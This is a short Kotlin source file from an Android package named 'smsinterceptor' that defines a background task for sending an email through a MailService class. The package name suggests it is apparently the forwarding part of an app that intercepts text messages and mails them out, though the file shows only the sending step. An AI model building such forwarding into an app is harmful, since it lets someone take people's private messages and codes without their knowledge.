package ru.smsinterceptor

import android.os.AsyncTask
import javax.mail.MessagingException;

class AsyncSender : AsyncTask<String, Void, Void>() {
    override fun doInBackground(vararg params: String?): Void? {
        val mailer = MailService(params[0], params[1], params[2], params[3], params[4])
        try {
            mailer.send()
        } catch (e: MessagingException) {
            e.printStackTrace()
        }
        return null
    }
}